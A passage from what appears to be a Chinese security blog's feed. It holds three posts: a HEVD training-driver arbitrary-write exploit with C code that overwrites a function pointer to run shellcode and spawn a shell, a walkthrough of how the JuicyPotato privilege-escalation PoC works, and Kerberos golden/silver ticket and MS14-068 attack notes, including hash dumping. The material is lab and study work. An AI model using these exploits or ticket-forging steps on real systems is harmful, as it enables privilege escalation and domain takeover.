    <content type="html"><![CDATA[<p>非预期方法，暂时不会放出来</p><span id="more"></span><h1 id="hevd练习-任意地址写"><a class="markdownIt-Anchor" href="#hevd练习-任意地址写"></a> HEVD练习-任意地址写</h1><h2 id="漏洞点"><a class="markdownIt-Anchor" href="#漏洞点"></a> 漏洞点</h2><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ab81f0548c9c7beae376282f0a845c14.png" alt="image-20240216173136321" /></p><h2 id="一点好玩的"><a class="markdownIt-Anchor" href="#一点好玩的"></a> 一点好玩的</h2><p>传入一个结构体，得到结构体过后写入内容</p><p>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">WRITE_WHAT_WHERE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* What;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* Where;</span><br><span class="line">&#125;arbitrary_write, *pArbitraryWrite;</span><br></pre></td></tr></table></figure><p>这里我做一个比较有意思的事儿，比如修改某个变量的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(arbitrary_write));</span><br><span class="line"><span class="keyword">if</span> (payload == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Malloc payload failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> vuln = <span class="number">0x10000</span>;</span><br><span class="line"><span class="type">int</span> pay = <span class="number">0xDEADBEEF</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] the vuln value is 0x%x\n&quot;</span>, vuln);</span><br><span class="line">payload-&gt;What = (<span class="type">unsigned</span> <span class="type">int</span> *)&amp;pay;</span><br><span class="line">payload-&gt;Where = (<span class="type">unsigned</span> <span class="type">int</span> *)&amp;vuln;</span><br><span class="line">DWORD size = <span class="keyword">sizeof</span>(payload);</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">DeviceIoControl(hDevice, ioctl,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] now vuln value is 0x%x&quot;</span>, vuln);</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/46a0ef83a8f20889bc2d73915c1ab5f1.png" alt="image-20240216174148214" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2a02f670b395a1f09d2e95b1992ce847.png" alt="image-20240216174214564" /></p><p>利用ioctl的机制也可以实现读取某个地址的值</p><h2 id="预期打法"><a class="markdownIt-Anchor" href="#预期打法"></a> 预期打法</h2><p>最开始栈溢出我们提权使用的是修改当前的Token的低位并修改Token的Present和Enable，如果这里我们知道地址的话就可以做一样的操作了</p><p>但是在普通权限下不可能知道地址，那么我们是否能够覆盖HEVD驱动中的某些函数，使用类似inline hook的方式，将函数地址改为我们shellcode的地址，这样我们把问题变成了和内核栈溢出类似的情况了</p><p>利用之前的<code>NtQueryInfomation</code>的<code>ulGetKernelBase</code>函数可以获得HEVD的基地址</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/9e0926c08abe24bc42efe409abb7e4a0.png" alt="image-20240216200738623" /></p><p>这里我就尝试覆写DbgPrintEx函数为shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(arbitrary_write));</span><br><span class="line"><span class="keyword">if</span> (payload == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Malloc payload failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">funcaddr hevd_base = ulGetKernelBase((PCHAR)<span class="string">&quot;HEVD&quot;</span>);</span><br><span class="line">funcaddr dbgprint_addr = hevd_base + <span class="number">0x2008</span>;</span><br><span class="line">funcaddr nt_base = ulGetKernelBase((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] HEVD SYS kernel base %llx\n&quot;</span>, hevd_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] ntoskrnl kernel base %llx\n&quot;</span>, nt_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] HEVD DbgPrint Address %llx\n&quot;</span>, dbgprint_addr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Allocate Shellcode Space\n&quot;</span>);</span><br><span class="line">LPVOID shellcode_addr = VirtualAlloc(<span class="literal">NULL</span>,</span><br><span class="line"><span class="keyword">sizeof</span>(cmd),</span><br><span class="line">MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (shellcode_addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] shellcode addr failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="keyword">sizeof</span>(cmd));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Shellcode addr %llx\n&quot;</span>, shellcode_addr);</span><br><span class="line"></span><br><span class="line">payload-&gt;What = (<span class="type">unsigned</span> <span class="type">int</span> *)&amp;shellcode_addr;</span><br><span class="line">payload-&gt;Where = (<span class="type">unsigned</span> <span class="type">int</span> *)dbgprint_addr;</span><br><span class="line">DWORD size = <span class="keyword">sizeof</span>(payload);</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">DeviceIoControl(hDevice, ioctl,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>注意，覆写的是<code>HEVD_BASE+0x2008</code>的值 所指向的值</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/575c9467678be806ed46eff70b42791e.png" alt="image-20240216210359750" /></p><p>成功覆写</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/d176b13c88d12fff078f41084333a6ed.png" alt="image-20240216210450239" /></p><p>现在比较麻烦的就是过SMEP保护。</p><p>可以利用之前GS保护使用的内核栈泄露<br /><a href="https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/">https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/</a></p><p>直接在栈上布置参数和ROP链，要么取消SMEP，要么参考KVAS直接使用ROP链申请的堆中执行，后续操作就和栈溢出一致，只不过需要把某个函数该地址改为第一个ROP地址</p><h2 id="非预期利用"><a class="markdownIt-Anchor" href="#非预期利用"></a> 非预期利用</h2><p>写到这里在翻查别人wp的时候突然想到驱动是一直在后台运行的，我们可以多次触发该漏洞，然后我用了一种非常规的方法，eee，目前这种方法我还用在一些项目上，所以暂时不公开…SORRY</p><p>方法可以参考：<a href="https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/">https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/</a><br />（虽然我的方法比他简单很多）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ffd66dc4226285ae67ff3ae69b05715a.png" alt="image-20240216232930887" /></p><p>可以优雅退出不卡顿</p><h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1><p><a href="https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/">https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;非预期方法，暂时不会放出来&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【内网】从PoC看JuicyPotato提权</title>
    <link href="https://joe1sn.eu.org/2024/02/23/potato-1/"/>
    <id>https://joe1sn.eu.org/2024/02/23/potato-1/</id>
    <published>2024-02-23T06:49:21.000Z</published>
    <updated>2024-02-23T06:53:20.081Z</updated>
    
    <content type="html"><![CDATA[<p>从此认识到自己不是做win安全的料</p><span id="more"></span><p>个人认为JuictPotato的前身是著名的<code>Rotten Potato</code></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d521498a177634056408fa3503d1d1362d5b0ac7.png" alt="image-20211022212121001" /></p><blockquote><ol><li>使用CoGetInstanceFromIStorage API 调用欺骗RPC,对代理进行身份验证.在此调用中指定了代理 IP/端口</li><li>RPC 向代理发送 NTLM 协商包</li><li>代理依赖的NTLM协商到RPC在端口135，被用作模板。同时，执行对AcceptSecurityContext的调用以强制进行本地身份验证<br />注:此包被修改为强制本地身份验证.</li><li>&amp; 5. RPC 135和AcceptSecurityContext用NTLM Challenge回复</li><li>将两个数据包的内容混合以匹配本地协商并转发到RPC</li><li>RPC使用发送到AcceptSecurityContext(8.)的NLTM Auth包进行响应，并执行模拟</li></ol></blockquote><ol><li><p>【PotatoAPI】创建COM监听器<code>startCOMListenerThread</code></p><ul><li><p>初始化<code>WinSocket</code>，创建非阻塞式socket，并监听<code>-t</code>端口。<strong>跳转到2</strong>，后面的就是监听循环中的</p></li><li><p>【LocalNegotiator】使用<code>processNtlmBytes</code>处理返回地NTLM信息。处理顺序刚好是1,2,3</p><ul><li>首先获取<a href="https://learn.microsoft.com/zh-cn/windows/win32/secgloss/s-gly"><em>安全主体</em></a>的预先存在的凭据的句柄，初始化Client和Sever的Token，建立安全上下文（新进程的身份验证），转发给RPC</li><li>RPC返回NTLM挑战应答问题，新进程的身份验证也会返回他的NTLM挑战应答问题，然后改装RPC的数据，塞入新进程的身份验证的NTLM挑战应答的部分数据</li><li>从系统回答中，创建新的system令牌</li></ul></li></ul></li><li><p>【PotatoAPI】同本地135端口建立RPC连接，发送消息从<code>PotatoAPI-&gt;rpcSendQ</code>走出队列</p></li><li><p>【PotatoAPI】触发<code>triggerDCOM</code></p><ul><li><code>StgCreateDocfileOnILockBytes</code>：创建Istorage对象</li><li>【IStorageTrigger】创建<code>IStorageTrigger</code>对象</li><li><code>CLSIDFromString</code>：将CLSID字符转为COM对象</li><li><code> CoGetInstanceFromIStorage</code> ：创建一个新的 对象，使用<code> IPersistFile：：Load</code>初始化</li><li><strong>触发DCOM后，进入1中的监听循环</strong></li></ul></li><li><p>通过得到的system token，经典的<code>CreateProcessWithTokenW</code>创建新的进程</p></li></ol><p>要一个人写的话工作量还是挺大的，而且<code>IstroageTrigger</code>得自己构造，感谢开源PoC！</p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p><p><a href="https://forum.butian.net/share/860">https://forum.butian.net/share/860</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;从此认识到自己不是做win安全的料&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/tags/notes/"/>
    
    <category term="pentest" scheme="https://joe1sn.eu.org/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>【内网】探索Windows内网的Kerberos协议</title>
    <link href="https://joe1sn.eu.org/2024/02/23/kerberos/"/>
    <id>https://joe1sn.eu.org/2024/02/23/kerberos/</id>
    <published>2024-02-23T04:29:23.000Z</published>
    <updated>2025-01-26T14:46:00.784Z</updated>
    
    <content type="html"><![CDATA[<p>感恩学校扎实的密码学功底，分析起来也是很简单的</p><span id="more"></span><p>说白了就一张图</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/173ba503f8f4d7d2cbc88312cb0a2551.png" alt="img" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1946078615b1e4c4c817b0bf733df49d.png" alt="img" /></p><h1 id="攻击方式"><a class="markdownIt-Anchor" href="#攻击方式"></a> 攻击方式</h1><h2 id="黄金票据"><a class="markdownIt-Anchor" href="#黄金票据"></a> 黄金票据</h2><p>第三步中 使用 KDC 特定账户 Krbtgt 的 NTLM-Hash 时，如果我们有了该<code>NTML-Hash</code>那么就能做到伪造TGT</p><p>该方法由于需要DC的<code>NTLM-Hash</code>，所以用于留后门</p><p>假设我们拿到了DC上administrator权限的shell</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/682d17bfb67add232b394fad39c00485.png" alt="image-20240222212152261" /></p><p>抓取Hash</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/bc35669581bb749a80113b2d145f4ac6.png" alt="image-20240222212207346" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/88027e45108649714df4180ab9a0df53.png" alt="image-20240222212223689" /></p><ul><li>CS使用的命令为：lsadump</li><li>相关项目：<a href="https://github.com/Xre0uS/MultiDump">https://github.com/Xre0uS/MultiDump</a></li></ul><p>获得管理员SID</p><ul><li>mimikatz一把梭</li><li><code>wmic useraccount get name,sid</code></li></ul><p>切换到域内用户的普通权限，制作黄金票据</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/698af4ca909c2457fd7e9bfce63ee691.png" alt="image-20240223092136452" /></p><p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Ckerberos.assets%5Cimage-20240223095513608.png" alt="image-20240223095513608" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/327782e54254105201209ef3d5936f2e.png" alt="image-20240223092217749" /></p><p><strong>横向移动</strong></p><p>先尝试访问文件夹</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f947a652d48ce2c94f6f5d9dd0888f94.png" alt="image-20240223095556996" /></p><p>原因：<a href="https://support.microsoft.com/zh-cn/topic/ms16-101-windows-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E7%A8%8B%E5%BA%8F%E8%AF%B4%E6%98%8E-2016-%E5%B9%B4-8-%E6%9C%88-9-%E6%97%A5-be16a40d-d7e2-c4b2-d885-6a22cff3cb77">https://support.microsoft.com/zh-cn/topic/ms16-101-windows-身份验证方法的安全更新程序说明-2016-年-8-月-9-日-be16a40d-d7e2-c4b2-d885-6a22cff3cb77</a></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f0814cff5a356db265a78fcdfb6ba1f3.png" alt="image-20240223095722593" /></p><p>貌似是WinServer2012的硬伤了，虚拟机必须用一些补丁才能用vmtools…</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/5961dacc540e39be013e953ae0c28242.png" alt="image-20240223100706455" /></p><h2 id="白银票据"><a class="markdownIt-Anchor" href="#白银票据"></a> 白银票据</h2><p>需要知道Server的<code>HTLM-Hash</code></p><p>使用该值伪造TGT，在第七步中发送给Server</p><blockquote><p>但是在有些服务中并没有验证 PAC 这一步，这也是白银票据能成功的前提，因为就算拥有用户的 Hash，可以伪造 TGS，但是也不能制作 PAC，PAC 当然也验证不成功，但是有些服务不去验证 PAC，这是白银票据成功的前提。</p></blockquote><h2 id="ms14-06"><a class="markdownIt-Anchor" href="#ms14-06"></a> MS14-06</h2><p>问题出在第四步</p><p>KDC会根据客户端指定PAC中数字签名的加密算法，以及PAC的加密算法，来校验PAC的合法性。这使得攻击者可通过伪造PAC，修改PAC中的SID，导致KDC判断攻击者为高权限用户，从而导致权限提升漏洞的产生</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;感恩学校扎实的密码学功底，分析起来也是很简单的&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
</feed>
